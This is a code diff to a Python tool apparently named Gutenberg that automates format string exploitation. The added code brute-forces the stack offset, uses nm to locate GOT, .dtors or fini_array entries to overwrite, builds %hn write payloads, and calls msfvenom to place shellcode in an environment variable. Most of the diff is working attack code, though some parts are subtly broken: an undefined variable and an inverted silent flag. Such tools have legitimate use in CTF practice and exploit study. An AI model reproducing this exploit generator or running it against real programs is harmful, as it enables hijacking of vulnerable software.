@@ -5,7 +5,8 @@
 #
 
 
-from os import access, X_OK, mkfifo
+from sys import stdout
+from os import access, X_OK, mkfifo, environ
 from os.path import realpath, isfile
 from io import StringIO
 from math import log
@@ -31,10 +32,28 @@ FMT_WRITE = "hn"
 
 
 #
+#  Entries
+#
+entries = [
+    b'__do_global_dtors_aux_fini_array_entry',
+    b'__DTOR_END__',
+    b'_GLOBAL_OFFSET_TABLE_',
+    b'__atexit'
+]
+
+
+#
 # Misc
 #
 MAX_ITER = 1000
 FIFO = "/tmp/gutenberg"
+silent = False
+
+
+def print_silent(*objects, sep=' ', end='\n', file=stdout, flush=False):
+    if silent:
+        print(*objects, sep=sep, end=end, file=file, flush=flush)
+    pass
 
 
 def generate_payload(where_to_write, offset, what_to_write=0x00180010, fmt=FMT_WRITE, chr_padd=0):
@@ -46,7 +65,16 @@ def generate_payload(where_to_write, offset, what_to_write=0x00180010, fmt=FMT_W
                                                                 nba2hx(where_to_write + 2),
                                                                 pw1, offset, fmt,
                                                                 pw2, offset + 1, fmt) + " " * chr_padd
-    return payload
+    return payload.replace('\0', '\\0')
+
+
+def detect_entries_table(binary):
+    r = run(["nm", realpath(binary)], stdout=PIPE).stdout
+    if r == b'':
+        return 0
+    else:
+        t = [ _ for _  in r.split(b'\n') if any(__ in _ for __ in entries) ]
+        return int(t[0][:8], 16)
 
 
 def exec_cmd_stdin(binary, cmd):
@@ -65,63 +93,85 @@ def exec_cmd_args(binary, cmd):
 
 def check(binary):
     if not access(binary, X_OK):
-        print("[-] Binary can't be executed")
+        print_silent("[-] Binary can't be executed")
         exit(1)
     else:
-        print("[+] File is executable")
+        print_silent("[+] Binary is executable")
+    try:
+        if not isfile(realpath(FIFO)):
+            mkfifo(FIFO)
+    except OSError as oe:
+        print_silent("[-] " + oe)
+        exit(1)
     pass
 
 
 def analyze(binary):
-    try:
-        if not isfile(realpath(binary)):
-            mkfifo(FIFO)
-    except OSError as oe:
-        print(oe)
-        exit(1)
-
     chr_padd = 0
     for i in range(MAX_ITER):
         payload = generate_payload(0x41414141, i, fmt=FMT_CHECK, chr_padd=chr_padd)
-        r = exec_cmd_args(binary, payload)
+        r = exec_cmd(binary, payload)
         if b'4141' in r:
             if r.split(b'-')[0][16:] != b'41414141':
                 i = 0
                 chr_padd += 1
             else:
-                print("WIN", i, r, payload)
+                print_silent("[+] Offset is {:d} with padding of {:d}".format(i, chr_padd))
                 break
+
+    where_to_write = detect_entries_table(binary)
+    if where_to_write == 0: # debug
+        print("[-] No entries to rewrite")
+        exit(1)
+    else:
+        print_silent("[+] We need to write in 0x{:08x}".format(where_to_write))
+    return generate_payload(where_to_write, i, fmt=FMT_WRITE, chr_padd=chr_padd)
+
+
+def exploit(binary, payload):
+    print_silent("[+] Payload ", end='')
+    print(payload)
     pass
 
 
-def exploit(binary):
-    pass
+def generate_shellcode():
+    shellcode = run(["msfvenom", cmd], stdout=PIPE)
+    print(shellcode)
+    return shellcode
 
 
 def main():
     parser = ArgumentParser(description = "Detect and analyse format string exploit")
     parser.add_argument("binary", metavar="binary", help="The binary to analyse")
-    # parser.add_argument("-m", "--method", default="both", choices=["args", "stdin", "both"], help="Use specific method") 
+    parser.add_argument("method", choices=["args", "stdin"], help="Use specific method") 
+    parser.add_argument("-s", "--silent", action="store_false", help="Only print final payload")
     parser.add_argument("-v", "--version", action="store_true", help="Print version number")
+    parser.add_argument("-e", "--environ", default="SHELLCODE", help="Print version number")
     args = parser.parse_args()
 
     if (args.version):
-        print("[+] Pandemic {}.{}.{}".format(gutenbreg_major, gutenbreg_minor, gutenbreg_bug))
-        print("[+] Made by the Rapace Diabolique\n")
+        print_silent("[+] Gutenberg {}.{}.{}".format(gutenbreg_major, gutenbreg_minor, gutenbreg_bug))
+        print_silent("[+] Made by the Rapace Diabolique\n")
+
+    global silent, exec_cmd
+    silent = args.silent
+    exec_cmd = exec_cmd_args if args.method == "args" else exec_cmd_stdin
 
     signal(SIGINT, signal_handler)
+    if not args.environ in environ:
+        environ[args.environ] = generate_shellcode()
 
-    print("[+] Checking file")
+    print_silent("[+] Checking file")
     check(args.binary)
-    print("[+] Analyzing file")
-    analyze(args.binary)
-    print("[+] Running exploit")
-    exploit(args.binary)
-    print("[+] Exiting")
+    print_silent("[+] Analyzing file")
+    payload = analyze(args.binary)
+    print_silent("[+] Running exploit")
+    exploit(args.binary, payload)
+    print_silent("[+] Exiting")
 
 
 def signal_handler(signal, frame):
-    print("[-] Search cancelled")
+    print_silent("[-] Search cancelled")
     exit(0)
 
 
